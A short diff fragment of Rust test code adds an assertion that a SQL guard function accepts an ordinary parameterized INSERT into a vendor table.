+        assert!(guard_raw_sql("INSERT INTO vendor (code, name) VALUES ($1, $2)").is_ok());
     }
 
     #[test]
